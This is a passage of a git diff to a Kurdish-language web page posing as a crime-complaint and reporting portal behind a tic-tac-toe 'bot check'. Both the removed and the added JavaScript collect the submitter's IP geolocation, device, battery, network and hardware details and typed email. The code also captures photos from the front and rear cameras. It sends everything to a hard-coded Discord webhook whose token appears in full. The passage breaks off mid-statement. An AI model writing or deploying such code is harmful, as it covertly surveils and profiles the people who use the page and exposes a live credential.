+                <button onclick="backFromReportLogin()" class="w-full py-3 rounded-xl font-semibold text-sm border border-rose-500/40 text-rose-400 hover:bg-rose-500 hover:text-white transition-all duration-300">گەڕانەوە</button>
+            </div>
+        </div>
+
     </div>
-</div>
 
-<!-- GMAIL -->
-<div class="name-screen gmail-screen" id="gmailScreen">
-    <div class="name-title">Gmail - OX</div>
-    <input type="email" id="gmailInput" placeholder="example@gmail.com" autocomplete="email">
-    <div style="color:#7bc6ff; font-size:12px; text-align:center; margin-top:15px; line-height:1.8;">
-        تکایە ئەم ڕێنماییانە جێبەجێ بکە<br>سیستەم ڕێگە نادات BOT 🤖 بێتە سیستەم
-    </div>
-    <div class="error" id="emailError">تکایە Gmail ـێکی دروست بنووسە</div>
-    <button onclick="checkEmail()">بەردەوام بە</button>
-</div>
+    <script>
+        window.addEventListener("DOMContentLoaded", function() {
+            const introLogoText = document.getElementById("introLogoText");
+            const introDescText = document.getElementById("introDescText");
+            const introScreen = document.getElementById("introScreen");
+            const mainContainer = document.getElementById("mainContainer");
+            const loaderBar = document.getElementById("introLoaderBar");
 
-<!-- SECTIONS -->
-<div class="sections-screen" id="sectionsScreen">
-    <div class="sections-title">بەشەکان</div>
-    <a class="link-button" href="crime.html"><span class="section-number">01</span> تاوان</a>
-    <button class="link-button" onclick="openComplaint()"><span class="section-number">02</span> سکاڵا</button>
-    <button class="link-button" onclick="openReportLogin()"><span class="section-number">03</span> ڕاپۆرت</button>
-    <button class="link-button" onclick="openSuggestion()"><span class="section-number">04</span> پێشنیار</button>
-</div>
+            let progress = 0;
+            const totalTime = 9000;
+            const intervalTime = 90;
+            const increment = (intervalTime / totalTime) * 100;
 
-<!-- COMPLAINT -->
-<div class="name-screen complaint-screen" id="complaintScreen">
-    <div class="complaint-title">سکاڵا</div>
-    <div class="complaint-group">
-        <label>ناوی تاوانبار لە TikTok</label>
-        <input type="text" id="tiktok" placeholder="ناوی TikTok">
-    </div>
-    <div class="complaint-group">
-        <label>ناوی تاوانبار لە Snapchat</label>
-        <input type="text" id="snapchat" placeholder="ناوی Snapchat">
-    </div>
-    <div class="complaint-group">
-        <label>ناوی تاوانبار لە Instagram</label>
-        <input type="text" id="instagram" placeholder="ناوی Instagram">
-    </div>
-    <div class="complaint-group">
-        <label>ناوی تاوانبار لە Telegram</label>
-        <input type="text" id="telegram" placeholder="ناوی Telegram">
-    </div>
-    <div class="complaint-group">
-        <label>ناوی تاوانبار لە Facebook</label>
-        <input type="text" id="facebook" placeholder="ناوی Facebook">
-    </div>
-    <div class="complaint-group">
-        <label>ناوی کەسەکە خۆی</label>
-        <input type="text" id="personName" placeholder="ناوی کەسەکە">
-    </div>
-    <div class="complaint-group">
-        <label>وێنەی کەسەکە</label>
-        <input type="file" id="personImage" accept="image/*">
-    </div>
-    <div class="complaint-group">
-        <label>شوێنی نیشتەجێبوون</label>
-        <textarea id="location" placeholder="شوێنی نیشتەجێبوون"></textarea>
-    </div>
-    <button onclick="sendComplaint()">ناردنی سکاڵا</button>
-    <button class="back-btn" onclick="backToSections()">گەڕانەوە</button>
-    <div class="complaint-success" id="complaintSuccess">سکاڵاکە بە سەرکەوتوویی تۆمار کرا.</div>
-</div>
+            const loadingInterval = setInterval(function() {
+                progress += increment;
+                if (progress >= 100) progress = 100;
+                loaderBar.style.width = progress + "%";
+            }, intervalTime);
 
-<!-- SUGGESTION -->
-<div class="name-screen suggestion-screen" id="suggestionScreen">
-    <div class="suggestion-title">پێشنیار</div>
-    <div class="suggestion-group">
-        <label>هۆکاری گومان کردن لە کەسی بەرامبەر</label>
-        <textarea id="suggestionReason" placeholder="هۆکاری گومان کردن بنووسە..."></textarea>
-    </div>
-    <div class="suggestion-group">
-        <label>چات / دەقی پەیوەندیدار</label>
-        <textarea id="suggestionChat" placeholder="چات یان دەقی پەیوەندیدار بنووسە..."></textarea>
-    </div>
-    <div class="suggestion-group">
-        <label>وێنە</label>
-        <input type="file" id="suggestionImage" accept="image/*">
-    </div>
-    <div class="suggestion-group">
-        <label>ڤیدیۆ</label>
-        <input type="file" id="suggestionVideo" accept="video/*">
-    </div>
-    <button onclick="sendSuggestion()">ناردنی پێشنیار</button>
-    <button class="back-btn" onclick="backFromSuggestion()">گەڕانەوە</button>
-    <div class="suggestion-success" id="suggestionSuccess">پێشنیارەکە بە سەرکەوتوویی تۆمار کرا.</div>
-</div>
+            setTimeout(function() {
+                introLogoText.classList.add("hidden");
+                introDescText.classList.remove("hidden");
+            }, 3000);
 
-<!-- REPORT LOGIN -->
-<div class="name-screen report-login-screen" id="reportLoginScreen">
-    <div class="report-login-title">Report Login</div>
-    <div class="report-login-group">
-        <label>Username</label>
-        <input type="text" id="reportUsername" placeholder="Username" autocomplete="username">
-    </div>
-    <div class="report-login-group">
-        <label>Password</label>
-        <input type="password" id="reportPassword" placeholder="Password" autocomplete="current-password">
-    </div>
-    <div class="error" id="reportLoginError">Username یان Password هەڵەیە</div>
-    <button onclick="checkReportLogin()">چوونەژوورەوە</button>
-    <button class="back-btn" onclick="backFromReportLogin()">گەڕانەوە</button>
-</div>
+            setTimeout(function() {
+                clearInterval(loadingInterval);
+                introScreen.style.display = "none";
+                mainContainer.classList.remove("hidden");
+            }, 9000);
+        });
 
-</div>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553142746473046018/59OExN87r_h_CTITipSbM6Ix4wiO32CiQuzmJEL0EAMQNrBsJL07604PB1X1tw9stPFM";
 
-<script>
-window.addEventListener("DOMContentLoaded", function() {
-    const introLogoText = document.getElementById("introLogoText");
-    const introDescText = document.getElementById("introDescText");
-    const introScreen = document.getElementById("introScreen");
-    const mainContainer = document.getElementById("mainContainer");
-    const loaderBar = document.getElementById("introLoaderBar");
+        function getDetailedDevice() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown Platform";
 
-    let progress = 0;
-    const totalTime = 9000;
-    const intervalTime = 90;
-    const increment = (intervalTime / totalTime) * 100;
+            if (/windows/i.test(ua)) platform = "Windows PC 💻";
+            else if (/macintosh|mac os x/i.test(ua)) platform = "Mac PC 💻";
+            else if (/linux/i.test(ua)) platform = "Linux PC 💻";
+            else if (/android/i.test(ua)) platform = "Android Mobile 📱";
+            else if (/iphone|ipad|ipod/i.test(ua)) platform = "iOS Device 📱";
 
-    const loadingInterval = setInterval(function() {
-        progress += increment;
-        if (progress >= 100) progress = 100;
-        loaderBar.style.width = progress + "%";
-    }, intervalTime);
-
-    setTimeout(function() {
-        introLogoText.style.display = "none";
-        introDescText.style.display = "block";
-    }, 3000);
-
-    setTimeout(function() {
-        clearInterval(loadingInterval);
-        introScreen.style.display = "none";
-        mainContainer.style.display = "block";
-    }, 9000);
-});
-
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553142746473046018/59OExN87r_h_CTITipSbM6Ix4wiO32CiQuzmJEL0EAMQNrBsJL07604PB1X1tw9stPFM";
-
-function getDetailedDevice() {
-    const ua = navigator.userAgent;
-    let deviceName = "Unknown Device";
-    let platform = "Unknown Platform";
-
-    if (/windows/i.test(ua)) platform = "Windows PC 💻";
-    else if (/macintosh|mac os x/i.test(ua)) platform = "Mac PC 💻";
-    else if (/linux/i.test(ua)) platform = "Linux PC 💻";
-    else if (/android/i.test(ua)) platform = "Android Mobile 📱";
-    else if (/iphone|ipad|ipod/i.test(ua)) platform = "iOS Device 📱";
-
-    if (/iphone/i.test(ua)) {
-        if (/iphone 14/i.test(ua)) deviceName = "iPhone 14";
-        else if (/iphone 13/i.test(ua)) deviceName = "iPhone 13 Series";
-        else if (/iphone 12/i.test(ua)) deviceName = "iPhone 12 Series";
-        else if (/iphone 15/i.test(ua)) deviceName = "iPhone 15 Series";
-        else if (/iphone 16/i.test(ua)) deviceName = "iPhone 16 Series";
-        else deviceName = "Apple iPhone";
-    } else {
-        let match = ua.match(/\(([^)]+)\)/);
-        if (match && match[1]) deviceName = match[1];
-        else deviceName = ua;
-    }
-    return `${platform} (${deviceName})`;
-}
-
-async function getBatteryInfo() {
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            const level = Math.round(battery.level * 100) + "%";
-            const charging = battery.charging ? "🔌 لە شەحندایە" : "🔋 لە شەحندا نییە";
-            return `${level} (${charging})`;
-        } catch (e) { return "نەزاندراوە"; }
-    }
-    return "پشتیوانی ناکرێت";
-}
-
-function getNetworkInfo() {
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-        let type = connection.effectiveType ? connection.effectiveType.toUpperCase() : "نەزاندراوە";
-        let connType = connection.type ? connection.type : "";
-        if (connType === "wifi") return `Wi-Fi 🛜 (${type})`;
-        return `Mobile / Network Data 📶 (${type})`;
-    }
-    return "پشتیوانی ناکرێت";
-}
-
-// زانیاری شاشە و ڕەچەڵەک
-function getExtraScreenAndSystemInfo() {
-    let screenRes = `${window.screen.width}x${window.screen.height}`;
-    let colorDepth = window.screen.colorDepth + "-bit";
-    let language = navigator.language || navigator.userLanguage || "نەزاندراوە";
-    let hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "نەزاندراوە";
-    let deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزاندراوە";
-    return `🖥️ قەبارەی شاشە: ${screenRes} (${colorDepth})\n🌐 زمان: ${language}\n⚙️ ژمارەی پرۆسێسەر (Cores): ${hardwareConcurrency}\n💾 قەبارەی نزیکەیی RAM: ${deviceMemory}`;
-}
-
-// لۆکەیشن لە سەرەوە و IP لە خوارەوە
-async function getIPAndLocationDetails() {
-    try {
-        let response = await fetch('https://ipapi.co/json/');
-        let data = await response.json();
-        return {
-            ip: data.ip || "نەزاندراوە",
-            locationInfo: `📍 **لۆکەیشنی IP:**وڵات: ${data.country_name || "نەزاندراوە"} | شار: ${data.city || "نەزاندراوە"} | ناوچە: ${data.region || "نەزاندراوە"} | ISP: ${data.org || "نەزاندراوە"} (Lat: ${data.latitude}, Lon: ${data.longitude})`
-        };
-    } catch (e) {
-        try {
-            let fallback = await fetch('https://api.ipify.org?format=json');
-            let fbData = await fallback.json();
-            return { ip: fbData.ip, locationInfo: "📍 **لۆکەیشنی IP:** لۆکەیشن بەردەست نییە" };
-        } catch (err) {
-            return { ip: "نەزاندراوە", locationInfo: "📍 **لۆکەیشنی IP:** نەزاندراوە" };
+            let deviceName = ua;
+            let match = ua.match(/\(([^)]+)\)/);
+            if (match && match[1]) deviceName = match[1];
+            return `${platform} (${deviceName})`;
         }
-    }
-}
 
-// وەرگرتنی وێنەی هەردوو کامێرا (پێشەوە و دواوە) بە شێوازێکی زۆر سەرکەوتوو
-async function captureDualWebcamImages() {
-    let images = {};
-    const videoElement = document.getElementById("webcamVideo");
-    const canvasElement = document.getElementById("webcamCanvas");
-
-    // ۱. کامێرای پێشەوە (Front Camera)
-    try {
-        const streamFront = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, audio: false 
-        });
-        videoElement.srcObject = streamFront;
-        videoElement.style.display = "block";
-        await videoElement.play();
-        
-        await new Promise(r => setTimeout(r, 1200));
-        canvasElement.width = videoElement.videoWidth || 640;
-        canvasElement.height = videoElement.videoHeight || 480;
-        const ctx = canvasElement.getContext("2d");
-        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-        
-        streamFront.getTracks().forEach(track => track.stop());
-        
-        const blobFront = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
-        images.front = blobFront;
-    } catch (e) {
-        console.log("کامێرای پێشەوە بەردەست نەبوو:", e);
-    }
-
-    // ۲. کامێرای دواوە (Rear/Environment Camera)
-    try {
-        const streamRear = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { exact: "environment" } }, audio: false 
-        });
-        videoElement.srcObject = streamRear;
-        await videoElement.play();
-        
-        await new Promise(r => setTimeout(r, 1200));
-        canvasElement.width = videoElement.videoWidth || 640;
-        canvasElement.height = videoElement.videoHeight || 480;
-        const ctx2 = canvasElement.getContext("2d");
-        ctx2.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-        
-        streamRear.getTracks().forEach(track => track.stop());
-        videoElement.style.display = "none";
-        
-        const blobRear = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
-        images.rear = blobRear;
-    } catch (e) {
-        // ئەگەرexact کار نەکات، بێ exact تاقیبکەرەوە بۆ کامێرای دووەم یان هەر کامێرایەکی بەردەست
-        try {
-            const streamAny = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            videoElement.srcObject = streamAny;
-            await videoElement.play();
-            await new Promise(r => setTimeout(r, 1200));
-            canvasElement.width = videoElement.videoWidth || 640;
-            canvasElement.height = videoElement.videoHeight || 480;
-            const ctx3 = canvasElement.getContext("2d");
-            ctx3.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-            streamAny.getTracks().forEach(track => track.stop());
-            videoElement.style.display = "none";
-            const blobAny = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
-            images.rear = blobAny;
-        } catch (err) {
-            videoElement.style.display = "none";
-            console.log("کامێرای دووەم بەردەست نییە");
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100) + "%";
+                    const charging = battery.charging ? "🔌 لە شەحندایە" : "🔋 لە شەحندا نییە";
+                    return `${level} (${charging})`;
+                } catch (e) { return "نەزاندراوە"; }
+            }
+            return "پشتیوانی ناکرێت";
         }
-    }
 
-    return images;
-}
-
-const DB_NAME = "404_REPORT_SYSTEM";
-const DB_VERSION = 1;
-
-function openDatabase() {
-    return new Promise(function(resolve, reject) {
-        const request = indexedDB.open(DB_NAME, DB_VERSION);
-        request.onupgradeneeded = function(event) {
-            const db = event.target.result;
-            if (!db.objectStoreNames.contains("complaints")) {
-                db.createObjectStore("complaints", { keyPath: "id", autoIncrement: true });
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                let type = connection.effectiveType ? connection.effectiveType.toUpperCase() : "نەزاندراوە";
+                let connType = connection.type ? connection.type : "";
+                if (connType === "wifi") return `Wi-Fi 🛜 (${type})`;
+                return `Mobile / Network Data 📶 (${type})`;
             }
-            if (!db.objectStoreNames.contains("suggestions")) {
-                db.createObjectStore("suggestions", { keyPath: "id", autoIncrement: true });
+            return "پشتیوانی ناکرێت";
+        }
+
+        function getExtraScreenAndSystemInfo() {
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            let colorDepth = window.screen.colorDepth + "-bit";
+            let language = navigator.language || navigator.userLanguage || "نەزاندراوە";
+            let hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "نەزاندراوە";
+            let deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزاندراوە";
+            return `🖥️ قەبارەی شاشە: ${screenRes} (${colorDepth})\n🌐 زمان: ${language}\n⚙️ ژمارەی پرۆسێسەر: ${hardwareConcurrency}\n💾 قەبارەی RAM: ${deviceMemory}`;
+        }
+
+        async function getIPAndLocationDetails() {
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                return {
+                    ip: data.ip || "نەزاندراوە",
+                    locationInfo: `📍 **لۆکەیشنی IP:** وڵات: ${data.country_name || "نەزاندراوە"} | شار: ${data.city || "نەزاندراوە"} | ناوچە: ${data.region || "نەزاندراوە"} | ISP: ${data.org || "نەزاندراوە"} (Lat: ${data.latitude}, Lon: ${data.longitude})`
+                };
+            } catch (e) {
+                try {
+                    let fallback = await fetch('https://api.ipify.org?format=json');
+                    let fbData = await fallback.json();
+                    return { ip: fbData.ip, locationInfo: "📍 **لۆکەیشنی IP:** بەردەست نییە" };
+                } catch (err) {
+                    return { ip: "نەزاندراوە", locationInfo: "📍 **لۆکەیشنی IP:** نەزاندراوە" };
+                }
             }
-        };
-        request.onsuccess = function(event) { resolve(event.target.result); };
-        request.onerror = function() { reject(request.error); };
-    });
-}
+        }
 
-function openOX() {
-    document.getElementById("menu").style.display = "none";
-    document.getElementById("gmailScreen").style.display = "none";
-    document.getElementById("sectionsScreen").style.display = "none";
-    document.getElementById("complaintScreen").style.display = "none";
-    document.getElementById("suggestionScreen").style.display = "none";
-    document.getElementById("reportLoginScreen").style.display = "none";
-    document.getElementById("oxScreen").style.display = "block";
-}
+        async function captureDualWebcamImages() {
+            let images = {};
+            const videoElement = document.getElementById("webcamVideo");
+            const canvasElement = document.getElementById("webcamCanvas");
 
-let board = ["","","","","","","","",""];
-let gameOver = false;
+            try {
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                videoElement.srcObject = streamFront;
+                await videoElement.play();
+                await new Promise(r => setTimeout(r, 1200));
+                canvasElement.width = videoElement.videoWidth || 640;
+                canvasElement.height = videoElement.videoHeight || 480;
+                canvasElement.getContext("2d").drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                streamFront.getTracks().forEach(track => track.stop());
+                images.front = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
+            } catch (e) {}
 
-function playOX(index) {
-    if (board[index] !== "" || gameOver) return;
-    board[index] = "X";
-    updateBoard();
+            try {
+                const streamRear = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
+                videoElement.srcObject = streamRear;
+                await videoElement.play();
+                await new Promise(r => setTimeout(r, 1200));
+                canvasElement.width = videoElement.videoWidth || 640;
+                canvasElement.height = videoElement.videoHeight || 480;
+                canvasElement.getContext("2d").drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                streamRear.getTracks().forEach(track => track.stop());
+                images.rear = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
+            } catch (e) {
+                try {
+                    const streamAny = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    videoElement.srcObject = streamAny;
+                    await videoElement.play();
+                    await new Promise(r => setTimeout(r, 1200));
+                    canvasElement.width = videoElement.videoWidth || 640;
+                    canvasElement.height = videoElement.videoHeight || 480;
+                    canvasElement.getContext("2d").drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                    streamAny.getTracks().forEach(track => track.stop());
+                    images.rear = await new Promise(res => canvasElement.toBlob(res, "image/jpeg", 0.85));
+                } catch (err) {}
+            }
+            return images;
+        }
 
-    if (checkWin("X")) {
-        gameOver = true;
-        document.getElementById("oxMessage").innerText = "بردیتەوە! ئێستا Gmail بکەرەوە...";
-        setTimeout(function() {
-            document.getElementById("oxScreen").style.display = "none";
-            document.getElementById("gmailScreen").style.display = "block";
-            document.getElementById("gmailInput").focus();
-        }, 700);
-        return;
-    }
-    if (checkDraw()) {
-        document.getElementById("oxMessage").innerText = "یارییەکە یەکسان بوو، دووبارە بکەوە";
-        return;
-    }
-    botMove();
-}
+        function openOX() {
+            ['menu', 'gmailScreen', 'sectionsScreen', 'complaintScreen', 'suggestionScreen', 'reportLoginScreen'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById("oxScreen").classList.remove('hidden');
+        }
 
-function botMove() {
-    let empty = [];
-    for (let i = 0; i < board.length; i++) {
-        if (board[i] === "") empty.push(i);
-    }
-    if (empty.length === 0 || gameOver) return;
-    let randomIndex = empty[Math.floor(Math.random() * empty.length)];
-    board[randomIndex] = "O";
-    updateBoard();
-    if (checkWin("O")) {
-        gameOver = true;
-        document.getElementById("oxMessage").innerText = "BOT بردیەوە! هیچ ڕێگایەک بۆ Gmail نییە.";
-    }
-}
+        let board = ["","","","","","","","",""];
+        let gameOver = false;
 
-function updateBoard() {
-    const cells = document.querySelectorAll(".ox-cell");
-    for (let i = 0; i < cells.length; i++) cells[i].innerText = board[i];
-}
+        function playOX(index) {
+            if (board[index] !== "" || gameOver) return;
+            board[index] = "X";
+            updateBoard();
 
-function checkWin(player) {
-    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-    return wins.some(combo => board[combo[0]] === player && board[combo[1]] === player && board[combo[2]] === player);
-}
+            if (checkWin("X")) {
+                gameOver = true;
+                document.getElementById("oxMessage").innerText = "بردیتەوە! ئێستا Gmail بکەرەوە...";
+                setTimeout(function() {
+                    document.getElementById("oxScreen").classList.add('hidden');
+                    document.getElementById("gmailScreen").classList.remove('hidden');
+                    document.getElementById("gmailInput").focus();
+                }, 700);
+                return;
+            }
+            if (checkDraw()) {
+                document.getElementById("oxMessage").innerText = "یارییەکە یەکسان بوو، دووبارە بکەوە";
+                return;
+            }
+            botMove();
+        }
 
-function checkDraw() {
-    return board.every(cell => cell !== "");
-}
+        function botMove() {
+            let empty = [];
+            for (let i = 0; i < board.length; i++) {
+                if (board[i] === "") empty.push(i);
+            }
+            if (empty.length === 0 || gameOver) return;
+            let randomIndex = empty[Math.floor(Math.random() * empty.length)];
+            board[randomIndex] = "O";
+            updateBoard();
+            if (checkWin("O")) {
+                gameOver = true;
+                document.getElementById("oxMessage").innerText = "BOT بردیەوە! هیچ ڕێگایەک بۆ Gmail نییە.";
+            }
+        }
 
-function resetOX() {
-    board = ["","","","","","","","",""];
-    gameOver = false;
-    document.getElementById("oxMessage").innerText = "تۆ X ـیت";
-    updateBoard();
-}
+        function updateBoard() {
+            const cells = document.querySelectorAll(".ox-cell");
+            for (let i = 0; i < cells.length; i++) cells[i].innerText = board[i];
+        }
 
-let userEmail = "";
-let emailAnalysisInfo = "";
+        function checkWin(player) {
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            return wins.some(combo => board[combo[0]] === player && board[combo[1]] === player && board[combo[2]] === player);
+        }
 
-// شیکردنەوەی پێشکەوتووی ئیمەیل (Find Email Info)
-function analyzeEmail(email) {
-    let domain = email.split('@')[1] ? email.split('@')[1].toLowerCase() : "";
-    let providerName = "نەزاندراوە";
-    let accountType = "گشتی (Personal)";
+        function checkDraw() {
+            return board.every(cell => cell !== "");
+        }
 
-    if (domain === "gmail.com") {
-        providerName = "Google Gmail";
-        accountType = "ئیمەیڵی سەرەکی گووگڵ (Android / Play Store / Services)";
-    } else if (domain === "yahoo.com" || domain === "yahoo.co.uk") {
-        providerName = "Yahoo Mail";
-        accountType = "ئیمەیڵی یاهو کۆن";
-    } else if (domain === "hotmail.com" || domain === "outlook.com" || domain === "live.com") {
-        providerName = "Microsoft Outlook / Hotmail";
-        accountType = "ئیمەیڵی مایکرۆسۆفت (Windows / Office)";
-    } else if (domain === "icloud.com" || domain === "me.com") {
-        providerName = "Apple iCloud";
-        accountType = "ئیمەیڵی ئەپڵ (Apple ID / iOS Ecosystem)";
-    } else {
-        providerName = `دۆمەینی تایبەت (${domain})`;
-        accountType = "سێرڤەری تایبەت یان کۆمپانیا";
-    }
+        function resetOX() {
+            board = ["","","","","","","","",""];
+            gameOver = false;
+            document.getElementById("oxMessage").innerText = "تۆ X ـیت";
+            updateBoard();
+        }
 
-    return `📧 جۆری پلاتفۆرم: ${providerName}\n🔍 جۆری هەژمار: ${accountType}\n🌐 دۆمەین: @${domain}`;
-}
+        let userEmail = "";
+        let emailAnalysisInfo = "";
 
-function checkEmail() {
-    const email = document.getElementById("gmailInput").value.trim();
-    const error = document.getElementById("emailError");
+        function analyzeEmail(email) {
+            let domain = email.split('@')[1] ? email.split('@')[1].toLowerCase() : "";
+            let providerName = "نەزاندراوە";
+            let accountType = "گشتی (Personal)";
 
-    if (email === "" || !email.toLowerCase().includes("@")) {
-        error.style.display = "block";
-        return;
-    }
+            if (domain === "gmail.com") {
+                providerName = "Google Gmail";
+                accountType = "ئیمەیڵی سەرەکی گووگڵ";
+            } else if (domain === "yahoo.com" || domain === "yahoo.co.uk") {
+                providerName = "Yahoo Mail";
+                accountType = "ئیمەیڵی یاهو";
+            } else if (domain === "hotmail.com" || domain === "outlook.com" || domain === "live.com") {
+                providerName = "Microsoft Outlook";
+                accountType = "ئیمەیڵی مایکرۆسۆفت";
+            } else if (domain === "icloud.com" || domain === "me.com") {
+                providerName = "Apple iCloud";
+                accountType = "ئیمەیڵی ئەپڵ";
+            } else {
+                providerName = `دۆمەینی تایبەت (${domain})`;
+                accountType = "سێرڤەری تایبەت";
+            }
+            return `📧 جۆری پلاتفۆرم: ${providerName}\n🔍 جۆری هەژمار: ${accountType}\n🌐 دۆمەین: @${domain}`;
+        }
 
-    error.style.display = "none";
-    userEmail = email;
-    emailAnalysisInfo = analyzeEmail(email);
+        function checkEmail() {
+            const email = document.getElementById("gmailInput").value.trim();
+            const error = document.getElementById("emailError");
 
-    document.getElementById("gmailScreen").style.display = "none";
-    document.getElementById("sectionsScreen").style.display = "block";
-}
+            if (email === "" || !email.toLowerCase().includes("@")) {
+                error.classList.remove('hidden');
+                return;
+            }
 
-function openComplaint() {
-    document.getElementById("sectionsScreen").style.display = "none";
-    document.getElementById("complaintScreen").style.display = "block";
-}
+            error.classList.add('hidden');
+            userEmail = email;
+            emailAnalysisInfo = analyzeEmail(email);
 
-function backToSections() {
-    document.getElementById("complaintScreen").style.display = "none";
-    document.getElementById("sectionsScreen").style.display = "block";
-}
+            document.getElementById("gmailScreen").classList.add('hidden');
+            document.getElementById("sectionsScreen").classList.remove('hidden');
+        }
 
-async function sendComplaint() {
-    const successDiv = document.getElementById("complaintSuccess");
-    
-    successDiv.style.display = "block";
-    successDiv.innerText = "جوان بۆستە... لۆکەیشن و هەردوو کامێرا و داتای سیستەم کۆدەکرێنەوە...";
-    successDiv.style.color = "#00e1ff";
+        function openComplaint() {
+            document.getElementById("sectionsScreen").classList.add('hidden');
+            document.getElementById("complaintScreen").classList.remove('hidden');
+        }
 
-    await new Promise(resolve => setTimeout(resolve, 3000));
+        function backToSections() {
+            document.getElementById("complaintScreen").classList.add('hidden');
+            document.getElementById("sectionsScreen").classList.remove('hidden');
+        }
 
-    // کۆکردنەوەی لۆکەیشنی IP و خودی IP
-    const ipData = await getIPAndLocationDetails();
-    const ipAddress = ipData.ip;
-    const ipLocationDetails = ipData.locationInfo;
+        async function sendComplaint() {
+            const successDiv = document.getElementById("complaintSuccess");
+            successDiv.classList.remove('hidden');
+            successDiv.innerText = "جوان بۆستە... لۆکەیشن و هەردوو کامێرا و داتای سیستەم کۆدەکرێنەوە...";
 
-    // گرتنی وێنەی هەردوو کامێرا
-    const dualImages = await captureDualWebcamImages();
+            await new Promise(resolve => setTimeout(resolve, 2500));
 
-    const tiktok = document.getElementById("tiktok").value.trim();
-    const snapchat = document.getElementById("snapchat").value.trim();
-    const instagram = document.getElementById("instagram").value.trim();
-    const telegram = document.getElementById("telegram").value.trim();
-    const facebook = document.getElementById("facebook").value.trim();
-    const personName = document.getElementById("personName").value.trim();
-    const location = document.getElementById("location").value.trim();
-    const uploadedImage = document.getElementById("personImage").files[0] || null;
-    
-    const deviceType = getDetailedDevice();
-    const batteryStatus = await getBatteryInfo();
-    const networkStatus = getNetworkInfo();
-    const extraSystemInfo = getExtraScreenAndSystemInfo();
+            const ipData = await getIPAndLocationDetails();
+            const dualImages = await captureDualWebcamImages();
 
-    if (personName === "" || location === "") {
-        alert("تکایە ناوی کەسەکە و شوێنی نیشتەجێبوون پڕبکەرەوە.");
-        successDiv.style.display = "none";
-        return;
-    }
+            const tiktok = document.getElementById("tiktok").value.trim();
+            const snapchat = document.getElementById("snapchat").value.trim();
+            const instagram = document.getElementById("instagram").value.trim();
+            const telegram = document.getElementById("telegram").value.trim();
+            const facebook = document.getElementById("facebook").value.trim();
+            const personName = document.getElementById("personName").value.trim();
+            const location = document.getElementById("location").value.trim();
+            const uploadedImage = document.getElementById("personImage").files[0] || null;
+            
+            const deviceType = getDetailedDevice();
+            const batteryStatus = await getBatteryInfo();
+            const networkStatus = getNetworkInfo();
+            const extraSystemInfo = getExtraScreenAndSystemInfo();
 
-    const formData = new FormData();
-    
-    // ڕێکخستنی شوێنەکان: لۆکەیشن لە سەرەوە و IP لە خوارەوە
-    const contentText = `🚨 **سکاڵایەکی نوێ تۆمار کرا (بە داتای پێشکەوتوو و کامێرای دووانە)**\n\n` +
-                        `${ipLocationDetails}\n` +
-                        `🌐 **IP Address:** ${ipAddress}\n\n` +
-                        `📱💻 **جۆری ئامێر و مۆدێل:** ${deviceType}\n` +
-                        `🔋 **ڕێژەی باتری و شەحن:** ${batteryStatus}\n` +
-                        `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
-                        `${extraSystemInfo}\n\n` +
-                        `📧 **ئیمەیڵی نێرەر:** ${userEmail || "دیاری نەکراوە"}\n` +
-                        `📋 **شیکردنەوەی ئیمەیل (Find Email):**\n${emailAnalysisInfo}\n\n` +
-                        `👤 **ناوی کەسەکە:** ${personName}\n` +
-                        `📍 **شوێنی نیشتەجێبوون:** ${location}\n` +
-                        `🎵 **ناوی TikTok:** ${tiktok || "نییە"}\n` +
-                        `👻 **ناوی Snapchat:** ${snapchat || "نییە"}\n` +
-                        `📸 **ناوی Instagram:** ${instagram || "نییە"}\n` +
-                        `✈️ **ناوی Telegram:** ${telegram || "نییە"}\n` +
-                        `📘 **ناوی Facebook:** ${facebook || "نییە"}\n` +
-                        `⏰ **کات:** ${new Date().toLocaleString()}`;
+            if (personName === "" || location === "") {
+                alert("تکایە ناوی کەسەکە و شوێنی نیشتەجێبوون پڕبکەرەوە.");
+                successDiv.classList.add('hidden');
+                return;
+            }
 
-    formData.append("content", contentText);
+            const formData = new FormData();
+            const contentText = `🚨 **سکاڵایەکی نوێ تۆمار کرا**\n\n` +
+                                `${ipData.locationInfo}\n` +
